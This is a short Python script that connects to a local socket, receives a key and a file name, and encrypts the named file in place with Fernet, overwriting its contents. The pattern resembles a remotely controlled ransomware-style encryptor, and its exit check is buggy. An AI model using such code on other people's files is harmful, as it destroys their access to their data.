import socket 
from cryptography.fernet import Fernet

def encrypt_file(key, file_name):
    with open(file_name, 'rb') as f:
        plain_text = f.read()

    cipher_suite = Fernet(key.encode('utf-8'))
    cipher_text = cipher_suite.encrypt(plain_text)

    with open(file_name, 'wb') as f:
        f.write(cipher_text)
  
def main(): 
    host = '127.0.0.1'
    port = 12345
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    s.connect((host,port)) 
  
    while True: 
        data = s.recv(1024) 
        
        data = str(data.decode('utf-8'))

        key, file_name = data.split(',')

        if file_name is '.__EXIT__.':
            break

        try:
            encrypt_file(key, file_name)
            s.send(b'Encryption Successful') 
        except:
            s.send(b'Encryption Fail') 

    s.close() 
  
if __name__ == '__main__': 
    main() 